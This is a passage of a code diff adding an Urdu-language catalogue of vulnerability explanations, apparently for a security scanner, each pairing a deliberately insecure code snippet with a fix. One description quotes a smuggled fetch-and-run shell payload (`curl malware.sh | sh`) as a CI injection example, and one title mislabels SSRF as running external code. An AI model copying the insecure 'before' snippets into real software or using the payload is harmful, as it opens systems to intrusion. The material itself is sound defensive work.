+      after: `# .env.example (commit کی گئی)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env ریپو سے باہر رہتی ہے (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "کوئی بھی تمام صارفین کا ڈیٹا پڑھ یا تبدیل کر سکتا ہے",
+    description:
+      "Row Level Security غیر فعال ہے، یا کوئی policy یہ چیک کیے بغیر کہ درخواست کون کر رہا ہے، ہر کسی کو رسائی دیتی ہے (USING (true))۔ ہر authenticated صارف — یا یہاں تک کہ anonymous بھی — باقی سب کا ڈیٹا پڑھ یا تبدیل کر سکتا ہے۔",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "صارف کی درج کردہ کوئی قدر براہ راست ڈیٹا بیس کی query میں چسپاں کر دی جاتی ہے",
+    description:
+      "ایک SQL query، parameters استعمال کرنے کے بجائے، کسی string کو براہ راست جوڑ کر (concatenate) یا interpolate کر کے بنائی جاتی ہے۔ اگر وہ متن (بالواسطہ ہی سہی) کسی صارف سے آتا ہے، تو وہ خود query کو بدل سکتا ہے — SQL injection۔",
+    fix: {
+      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "پاس ورڈز محفوظ نہیں معلوم ہوتے",
+    description:
+      "پاس ورڈ کا فیلڈ بالکل ویسے ہی محفوظ کیا جاتا ہے جیسے درخواست میں آیا تھا، اور فائل میں کوئی hashing فنکشن (bcrypt، argon2، scrypt) نظر نہیں آتا۔ اگر ڈیٹا بیس compromise ہو جائے تو تمام پاس ورڈز فوری طور پر قابلِ استعمال ہوں گے۔",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "لاگ ان sign کرنے کے لیے استعمال ہونے والا secret کوڈ میں صاف الفاظ میں لکھا ہوا ہے",
+    description:
+      "jwt.sign / jwt.verify کو دیا جانے والا secret (یا JWT_SECRET variable) environment variable سے آنے کے بجائے کوڈ میں لفظی قدر ہے۔ جو بھی اسے پڑھے گا وہ کسی بھی صارف کے لیے valid access token بنا سکتا ہے۔",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "سرور کو بیرونی کمانڈز چلانے پر مجبور کیا جا سکتا ہے",
+    description:
+      "سسٹم کمانڈز چلانے والا فنکشن (exec، execSync، spawn) ایسی string وصول کرتا ہے جو interpolation یا concatenation سے بنائی گئی ہو۔ اگر اس string کا کوئی حصہ صارف کے input سے آتا ہے، تو جو اسے کنٹرول کرے وہ سرور پر من چاہی کمانڈز چلوا سکتا ہے۔",
+    fix: {
+      before: "execSync(`convert ${filename} output.png`)",
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "سرور پر موجود کوئی فائل باہر سے path منتخب کر کے پڑھی یا لکھی جا سکتی ہے",
+    description:
+      'کوئی فائل پڑھنے، لکھنے یا بھیجنے والا فنکشن اس کا path براہ راست درخواست کی کسی قدر (query، body، params) سے لیتا ہے، یہ چیک کیے بغیر کہ وہ اجازت یافتہ فولڈر کے اندر ہی رہے۔ کوئی حملہ آور "../" شامل کر کے متوقع فولڈر سے باہر نکل سکتا ہے اور سرور پر کوئی بھی فائل پڑھ یا overwrite کر سکتا ہے (مثلاً credentials والی configuration فائل)۔',
+    fix: {
+      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("راستہ اجازت یافتہ نہیں")\n  res.sendFile(target)\n})`,
+    },
+  },
+  "nosql-injection": {
+    title: "صارف کی درج کردہ قدر MongoDB کی query کے اندر کوڈ کے طور پر چلا دی جاتی ہے",
+    description:
+      "MongoDB کا $where operator ہر document کے لیے سرور کی طرف JavaScript چلاتا ہے — اگر وہ string صارف سے آنے والی قدر جوڑ کر بنائی گئی ہو، تو جو اسے کنٹرول کرے وہ ڈیٹا بیس کے context میں من چاہا کوڈ چلوا سکتا ہے، نہ کہ صرف عام SQL injection کی طرح filter بدل سکتا ہے۔",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "صارف کی درج کردہ قدر کو ڈیٹا کے بجائے ایک template سمجھ لیا جاتا ہے",
+    description:
+      "template compile/run کرنے والا فنکشن مکمل template درخواست کی کسی قدر سے وصول کرتا ہے، بجائے اس کے کہ ایک fixed template استعمال ہو اور صرف ڈیٹا پاس کیا جائے۔ کوئی حملہ آور براہ راست template engine کی syntax میں لکھ سکتا ہے (مثلاً Jinja2 کے لیے {{7*7}}) اور سرور پر کوڈ چلا سکتا ہے — Server-Side Template Injection، جو اکثر محض XSS جیسے ڈسپلے مسئلے کے بجائے من چاہی کمانڈز کے execution تک لے جاتا ہے۔",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "XML parser کو فائلیں پڑھنے یا بیرونی درخواستیں بھیجنے پر مجبور کیا جا سکتا ہے",
+    description:
+      "ایک XML parser (DocumentBuilderFactory) قریبی سطور میں بیرونی entities (DOCTYPE) کو واضح طور پر غیر فعال کیے بغیر بنایا جاتا ہے۔ اگر parser کسی غیر معتبر ذریعے سے XML وصول کرے، تو حملہ آور ایک external entity define کر کے سرور پر فائلیں پڑھ سکتا ہے یا اسے اپنی مرضی کے پتے سے رابطہ کروا سکتا ہے — XML External Entity۔",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Dockerfile کی کسی ENV یا ARG instruction میں براہ راست کوئی راز لکھا ہوا ہے",
+    description:
+      "password/secret/token/key جیسے نام والی کوئی variable ENV یا ARG instruction میں لفظی قدر رکھتی ہے۔ .env فائل کے برعکس (جو عموماً image میں شامل نہیں ہوتی)، یہ قدر خود Docker image میں شامل ہو جاتی ہے — جو بھی اسے pull کرے یا layer history دیکھے وہ اسے حاصل کر سکتا ہے، چاہے Dockerfile کے بعد والے ورژن میں وہ سطر ہٹا بھی دی جائے۔",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# یوں پاس کیا جاتا ہے: docker build --build-arg DB_PASSWORD=*** (یا، بہتر ہے کہ\n# BuildKit کا secret mount استعمال کریں، جو layer history میں شامل نہیں ہوتا)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Kubernetes manifest کا ایک container privileged کے طور پر چل رہا ہے",
+    description:
+      'container کے securityContext میں "privileged: true" container اور host کے درمیان عام طور پر موجود تقریباً تمام isolation ختم کر دیتا ہے: container host کے devices تک رسائی حاصل کر سکتا ہے، اس کی network configuration بدل سکتا ہے، اور کئی صورتوں میں چلانے والی مشین پر عملاً root رسائی حاصل کر سکتا ہے۔ ایک عام ایپ کے لیے تقریباً کبھی ضروری نہیں ہوتا۔',
+    fix: {
+      before: `securityContext:\n  privileged: true`,
+      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # صرف واقعی ضروری capabilities`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Kubernetes manifest کی env variable میں کوئی راز صاف الفاظ میں لکھا ہوا ہے",
+    description:
+      'password/secret/token/key جیسے نام والی ایک environment variable، Secret ("valueFrom.secretKeyRef") سے پڑھنے کے بجائے لفظی قدر ("value:") رکھتی ہے۔ manifest خود — جو اکثر کسی ریپوزٹری میں commit کی جاتی ہے — اس طرح راز کو صاف الفاظ میں رکھتی ہے، جو اس شخص کو بھی نظر آتا ہے جو صرف configuration پڑھ سکتا ہو، ضروری نہیں کہ cluster میں کمانڈز چلا سکے۔',
+    fix: {
+      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
+      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Terraform کا کوئی security group ایک حساس پورٹ پورے انٹرنیٹ کے لیے کھول دیتا ہے",
+    description:
+      'ایک rule جس کے "cidr_blocks" میں 0.0.0.0/0 (کوئی بھی IP ایڈریس) شامل ہو، کسی حساس پورٹ کے قریب ہے — SSH (22)، RDP (3389)، یا ڈیٹا بیس کی کوئی عام پورٹ (MySQL، Postgres، MongoDB، Redis، SQL Server)۔ انٹرنیٹ پر کوئی بھی اس سروس سے جڑنے کی کوشش کر سکتا ہے، نہ کہ صرف وہ جسے اجازت ہونی چاہیے۔',
+    fix: {
+      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
+      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # صرف آپ کا private نیٹ ورک، یا کوئی bastion host\n}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Google Cloud کا کوئی firewall rule ایک حساس پورٹ پورے انٹرنیٹ کے لیے کھول دیتا ہے",
+    description:
+      'ایک "google_compute_firewall" resource، جس کے "source_ranges" میں 0.0.0.0/0 (کوئی بھی IP ایڈریس) شامل ہو، کسی حساس پورٹ کی طرف ٹریفک کی اجازت دیتا ہے — SSH (22)، RDP (3389)، یا ڈیٹا بیس کی کوئی عام پورٹ (MySQL، Postgres، MongoDB، Redis، SQL Server)۔ انٹرنیٹ پر کوئی بھی اس سروس سے جڑنے کی کوشش کر سکتا ہے، نہ کہ صرف وہ جسے اجازت ہونی چاہیے۔',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # صرف آپ کا private نیٹ ورک، یا کوئی bastion host\n}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Azure کا کوئی network rule ایک حساس پورٹ پورے انٹرنیٹ کے لیے کھول دیتا ہے",
+    description:
+      'ایک network security rule ("azurerm_network_security_rule"، یا "azurerm_network_security_group" کے اندر "security_rule" بلاک) جس کا "source_address_prefix" "*" یا "0.0.0.0/0" ہو، سمت "Inbound" اور رسائی "Allow" ہو، کسی حساس پورٹ کے قریب ہے — SSH (22)، RDP (3389)، یا ڈیٹا بیس کی کوئی عام پورٹ۔ انٹرنیٹ پر کوئی بھی اس سروس سے جڑنے کی کوشش کر سکتا ہے، نہ کہ صرف وہ جسے اجازت ہونی چاہیے۔',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # صرف آپ کا private نیٹ ورک، یا کوئی bastion host\n}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Terraform کی کسی variable کی default قدر کے طور پر کوئی راز لکھا ہوا ہے",
+    description:
+      'password/secret/token/key جیسے نام والی ایک variable کے "default" میں لفظی قدر موجود ہے۔ runtime پر پاس کی جانے والی قدر (tfvars، TF_VAR_* environment variables) کے برعکس، default سورس کوڈ میں ہی رہ جاتا ہے — اور اگر ریپوزٹری shared یا عوامی ہو، تو کوئی بھی اسے دیکھ سکتا ہے، Terraform state تک رسائی کے بغیر بھی۔',
+    fix: {
+      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
+      after: `variable "db_password" {\n  # کوئی default نہیں: اسے .tfvars فائل (git سے باہر) یا TF_VAR_db_password environment variable کے ذریعے پاس کریں\n  sensitive = true\n}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "کسی بیرونی صارف کے کنٹرول کردہ قدر براہ راست CI کے shell کمانڈ میں داخل ہو جاتی ہے",
+    description:
+      'GitHub Actions workflow کا کوئی "run:" کمانڈ براہ راست کوئی قدر interpolate کرتا ہے، جیسے pull request کا عنوان، branch کا نام، یا کسی comment کا متن — یہ سب وہ شخص لکھ سکتا ہے جو کوئی pull request یا comment کھولے، چاہے وہ کسی بیرونی fork سے ہی کیوں نہ ہو۔ `"; curl malware.sh | sh #` جیسی قدر CI میں من چاہی کمانڈز چلا دے گی، اس workflow میں دستیاب تمام راز تک رسائی کے ساتھ۔',
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # environment variable کے طور پر پاس کیا گیا، کبھی بھی کمانڈ میں براہ راست interpolate نہیں کیا گیا`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "Workflow کسی بیرونی pull request کا کوڈ ریپوزٹری کے رازوں تک رسائی کے ساتھ چلاتا ہے",
+    description:
+      'یہ workflow "pull_request_target" استعمال کرتا ہے — جو کسی اجنبی fork سے کھولی گئی pull request کے لیے بھی base ریپوزٹری کے permissions اور رازوں کے ساتھ چلتا ہے — اور خود pull request کے کوڈ ("github.event.pull_request.head") کا checkout کرتا ہے، نہ کہ base branch کا۔ جو شخص pull request کھولتا ہے وہ عملاً اپنا کوڈ ان رازوں تک رسائی کے ساتھ چلوا لیتا ہے۔',
+    fix: {
+      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # base branch کا checkout کریں، نہ کہ PR کے کوڈ کا — یا اگر وسیع\n      # permissions/راز درکار نہیں تو "pull_request_target" کی بجائے\n      # "pull_request" استعمال کریں۔\n      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "درخواست کا ڈیٹا ایسے format میں deserialize کیا جاتا ہے جو کوڈ چلا سکتا ہے",
+    description:
+      "pickle (Python)، unserialize() (PHP)، ObjectInputStream (Java) یا node-serialize لائبریری (Node) درخواست سے براہ راست لی گئی کسی قدر کو deserialize کر رہے ہیں۔ JSON کے برعکس، یہ formats deserialization کے دوران ہی کوڈ کو represent اور execute کر سکتے ہیں — جو بھیجی گئی قدر کو کنٹرول کرے وہ سرور پر من چاہا کوڈ چلوا سکتا ہے۔",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json\ndata = json.loads(request.data)  # JSON پارسنگ کے دوران کبھی کوڈ نہیں چلاتا، pickle کے برعکس`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'کوڈ واضح طور پر بغیر sign کیے JWT ٹوکنز کو قبول کرتا ہے (الگورتھم "none")',
+    description:
+      '"none" JWT ٹوکن verify کرنے کے لیے قبول شدہ الگورتھمز میں شامل ہے۔ "none" الگورتھم والے ٹوکن کے پاس verify کرنے کے لیے کوئی sign موجود نہیں ہوتا: کوئی بھی کسی بھی مواد کے ساتھ (مثلاً ایک ایڈمن role) ایسا ٹوکن بنا سکتا ہے اور کوڈ اسے valid مان لے گا۔',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // قبول شدہ الگورتھمز میں کبھی "none" شامل نہ کریں`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "کوئی نئی ٹیبل بغیر کسی تحفظ کے بنائی گئی معلوم ہوتی ہے",
+    description:
+      "ایک SQL migration ٹیبل بناتی ہے لیکن اسی فائل میں اسی ٹیبل کے لیے Row Level Security فعال نہیں کرتی۔ جب تک یہ ایسے ہی رہے، ٹیبل اس پابندی کے بغیر وجود میں آتی ہے کہ اسے کون پڑھ یا لکھ سکتا ہے۔",
+    fix: {
+      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
+      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
+    title: "یہ سائٹ کسی بھی دوسری ویب سائٹ سے آنے والی درخواستیں قبول کرتی ہے",
+    description:
+      "CORS header کسی بھی origin (*) سے درخواستیں قبول کرنے کے لیے سیٹ ہے، یا cors() middleware بغیر کسی پابندی کے استعمال ہو رہا ہے۔ کوئی بھی third-party ویب سائٹ، پہلے سے authenticated صارف کے براؤزر سے، آپ کی APIs کو کال کر سکتی ہے۔",
+    fix: {
+      before: `app.use(cors())`,
+      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
+    },
+  },
+  "admin-function-missing-auth": {
+    title: "ایڈمن permissions والا ایک فنکشن یہ چیک نہیں کرتا کہ اسے کون استعمال کر رہا ہے",
+    description:
+      "ایک route یا فنکشن جس کا نام ایڈمن آپریشنز کی طرف اشارہ کرتا ہے، قریبی سطور میں کوئی authentication یا role چیک نہیں رکھتا۔ جو بھی اس کا URL جانتا ہو وہ اسے چلا سکتا ہے۔",
+    fix: {
+      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
+    },
+  },
+  ssrf: {
+    title: "سائٹ کو بیرونی کوڈ چلانے پر مجبور کیا جا سکتا ہے",
+    description:
+      "ایک outgoing HTTP درخواست (fetch، axios) صارف کی درخواست سے آنے والی قدر کو براہ راست منزل کے URL کے طور پر استعمال کرتی ہے۔ کوئی بدنیت صارف آپ کے سرور سے اندرونی یا من چاہے پتے کال کروا سکتا ہے — Server-Side Request Forgery۔",
+    fix: {
+      before: `const data = await fetch(req.query.url)`,
+      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL کی اجازت نہیں")\nconst data = await fetch(req.query.url)`,
+    },
+  },
+  "weak-password-hashing": {
+    title: "پاس ورڈز اب ایک ایسے طریقے سے محفوظ ہیں جسے توڑنا آسان ہو چکا ہے",
+    description:
+      "ایک ہی سطر میں، md5() یا sha1() کسی پاس ورڈ سے جڑی قدر پر لاگو کیے جاتے ہیں۔ یہ الگورتھمز حساب کرنے میں بہت تیز ہیں: ڈیٹا بیس رکھنے والا حملہ آور فی سیکنڈ اربوں پاس ورڈز آزما سکتا ہے۔",
+    fix: {
+      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
+      after: `const hashed = await bcrypt.hash(password, 12)`,
+    },
+  },
+  "k8s-run-as-root": {
+    title: "Kubernetes manifest کا ایک container root کے طور پر چلنے کے لیے سیٹ ہے",
+    description:
+      '"runAsUser: 0" یا "runAsNonRoot: false" securityContext میں container کے اندر root کے طور پر چلنے کو واضح طور پر نافذ کرتے ہیں۔ اگر کوئی حملہ آور container میں کوڈ چلانے میں کامیاب ہو جائے (مثلاً کسی vulnerable لائبریری کا فائدہ اٹھا کر)، تو container کے اندر root ہونا host کی طرف ممکنہ فرار یا زیادہ وسیع اثر کو آسان بنا دیتا ہے۔',
+    fix: {
+      before: `securityContext:\n  runAsUser: 0`,
+      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
+    },
+  },
+  "k8s-privilege-escalation": {
+    title: "Kubernetes manifest کا ایک container اپنے ابتدائی privileges سے زیادہ حاصل کر سکتا ہے",
+    description:
+      '"allowPrivilegeEscalation: true" securityContext میں container کے اندر کسی process کو اسے شروع کرنے والے process سے زیادہ privileges حاصل کرنے دیتا ہے (مثلاً setuid sticky bit والی کسی binary کے ذریعے)۔ ایپلیکیشن میں کسی vulnerability کے ساتھ مل کر، یہ متوقع سے زیادہ privileges کے ساتھ کوڈ چلانے کی طرف ایک اضافی قدم ہے۔',
+    fix: {
+      before: `securityContext:\n  allowPrivilegeEscalation: true`,
+      after: `securityContext:\n  allowPrivilegeEscalation: false`,
+    },
+  },
+  "k8s-host-namespace-access": {
+    title: "Kubernetes manifest کا ایک pod host کا نیٹ ورک، processes یا shared memory شیئر کرتا ہے",
+    description:
+      '"hostNetwork"، "hostPID" یا "hostIPC" کو true پر سیٹ کرنا pod کو اس کے معمول کے isolation سے باہر نکال دیتا ہے: hostNetwork پود کو host کے نیٹ ورک پر ظاہر کرتا ہے (cluster کی network policies کو bypass کرتے ہوئے)، hostPID اسے host مشین کے تمام processes دیکھنے کی اجازت دیتا ہے، hostIPC اسے host کی shared memory تک رسائی دیتا ہے۔ ایک عام ایپ کے لیے تقریباً کبھی ضروری نہیں — عموماً صرف نچلے درجے کے سسٹم/مانیٹرنگ ٹولز کے لیے مخصوص ہے۔',
+    fix: {
+      before: `spec:\n  hostNetwork: true`,
+      after: `spec:\n  hostNetwork: false`,
+    },
+  },
+  "terraform-s3-block-public-access-disabled": {
+    title: "Terraform میں define کیے گئے S3 bucket پر Block Public Access غیر فعال ہے",
+    description:
+      '"aws_s3_bucket_public_access_block" کی چار protections (block_public_acls، ignore_public_acls، block_public_policy، restrict_public_buckets) میں سے ایک یا زیادہ false پر سیٹ ہیں۔ اس کا مطلب یہ نہیں کہ bucket پہلے سے عوامی ہے، لیکن یہ وہ حفاظتی جال ہٹا دیتا ہے جو مستقبل میں غلطی سے اسے عوامی ہونے سے روکتا۔',
+    fix: {
+      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
+      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
+    },
+  },
+  "terraform-iam-wildcard-policy": {
+    title: "Terraform میں define کی گئی ایک IAM policy مکمل رسائی دیتی ہے",
+    description:
+      'action "*" اور resource "*" والا statement ہر AWS سروس اور resource تک مکمل رسائی دیتا ہے — یہی چیک پہلے ہی live IAM state پر کیا جا چکا ہے، یہاں اسے apply ہونے سے پہلے ہی کوڈ سے براہ راست پڑھا گیا ہے۔ یہ کسی ایمرجنسی role کے لیے مقصود ہو سکتا ہے، لیکن اس کی تصدیق ہونی چاہیے: روزمرہ استعمال کے لیے صرف وہی permissions دیں جو واقعی ضروری ہیں۔',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "ایک Google Cloud Storage bucket کسی کے بھی لیے پڑھنے کے قابل بنا دیا گیا ہے",
+    description:
+      'ایک "google_storage_bucket_iam_member" یا "google_storage_bucket_iam_binding" resource "allUsers" یا "allAuthenticatedUsers" کو کوئی role دیتی ہے — پہلا bucket کو انٹرنیٹ پر کسی کے بھی لیے پڑھنے کے قابل بنا دیتا ہے، Google اکاؤنٹ کے بغیر بھی؛ دوسرا کسی بھی Google اکاؤنٹ رکھنے والے کے لیے، نہ کہ صرف اس کے لیے جسے رسائی ملنی چاہیے۔',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # صرف وہ جسے واقعی رسائی ہونی چاہیے، allUsers/allAuthenticatedUsers نہیں\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Azure کے کسی storage اکاؤنٹ پر blob کی عوامی رسائی فعال ہے",
+    description:
+      '"allow_blob_public_access" "azurerm_storage_account" پر true پر سیٹ ہے: جو بھی عوامی بنائے گئے blob/container کا URL جانتا ہو، بغیر کسی authentication کے اسے پڑھ سکتا ہے۔',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "ایک Google Cloud IAM role مکمل رسائی دیتا ہے (Owner/Editor)",
+    description:
+      'ایک "google_project_iam_binding"/"google_project_iam_member" (یا organization/folder کی سطح کا متبادل) پرائمیٹو role "roles/owner" یا "roles/editor" تفویض کرتا ہے — پراجیکٹ کی تقریباً ہر سروس تک قریب مکمل رسائی۔ یہ کسی ایمرجنسی اکاؤنٹ کے لیے مقصود ہو سکتا ہے، لیکن اس کی تصدیق ہونی چاہیے: روزمرہ استعمال کے لیے صرف وہی مخصوص predefined roles دیں جو واقعی ضروری ہیں۔',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # صرف وہ predefined role جو واقعی ضروری ہے، roles/owner نہیں\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "Azure کی role assignment مکمل رسائی دیتی ہے (Owner)",
+    description:
+      'ایک "azurerm_role_assignment" "Owner" role تفویض کرتا ہے — مکمل رسائی، بشمول دیگر صارفین کے permissions پر کنٹرول، پورے تفویض شدہ scope (subscription، resource group...) پر۔ یہ کسی ایمرجنسی اکاؤنٹ کے لیے مقصود ہو سکتا ہے، لیکن اس کی تصدیق ہونی چاہیے: روزمرہ استعمال کے لیے صرف وہ مخصوص role دیں جو واقعی ضروری ہے (مثلاً کسی ایک resource group پر "Contributor")۔',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # صرف وہ مخصوص role جو واقعی ضروری ہے، پوری subscription پر Owner نہیں\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "ایک سیکیورٹی ٹوکن غیر محفوظ random number generator سے بنایا گیا ہے",
+    description:
+      "token/session/reset/otp/csrf جیسے نام والی ایک قدر Math.random() (JS)، random.random() (Python) یا rand() (PHP) سے بنائی گئی ہے — یہ generators سیکیورٹی کے لیے نہیں بنائے گئے، اور ان کی sequences predictable ہوتی ہیں۔ اس طرح بنایا گیا ٹوکن اندازہ لگایا یا دوبارہ بنایا جا سکتا ہے، جس سے اس کا مقصد ہی ختم ہو جاتا ہے (مثلاً پاس ورڈ ری سیٹ کا وہ link جسے کوئی بھی پیشگوئی کر سکے)۔",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto، Math.random نہیں — ناقابلِ پیشگوئی`,
+    },
+  },
+  "ldap-injection": {
+    title: "ایک LDAP filter درخواست کی کسی قدر کو براہ راست جوڑ کر بنایا جاتا ہے",
+    description:
+      'LDAP filter بنانے والی ایک سطر (مثلاً "(uid=...)") درخواست سے لی گئی کوئی قدر براہ راست شامل کرتی ہے، LDAP کے خاص characters کا کوئی escape کیے بغیر۔ جو اس قدر کو کنٹرول کرے وہ filter کی منطق بدل سکتا ہے — مثلاً کسی authentication چیک کو bypass کر سکتا ہے یا directory کا وہ ڈیٹا پڑھ سکتا ہے جو اسے نہیں دیکھنا چاہیے۔',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // filter میں استعمال سے پہلے LDAP کے خاص characters کا escape ہمیشہ کرنا چاہیے\nclient.search(base, { filter });",
+    },
+  },
+  "xss-dangerous-html": {
+    title: "صارفین کا لکھا ہوا متن براؤزر میں کوڈ چلا سکتا ہے",
+    description:
+      "کچھ مواد صفحے میں سادہ متن کے بجائے خام HTML کے طور پر شامل کیا جاتا ہے (dangerouslySetInnerHTML، v-html، .innerHTML)۔ اگر اس مواد میں صارف کا input شامل ہو، تو اس میں ایسے scripts ہو سکتے ہیں جو صفحہ پڑھنے والے کے براؤزر میں چل جائیں۔",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// یا، اگر HTML درکار ہو: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "اپ لوڈ کی گئی فائلوں کی جگہ کسی کے لیے بھی نظر آتی ہے",
+    description:
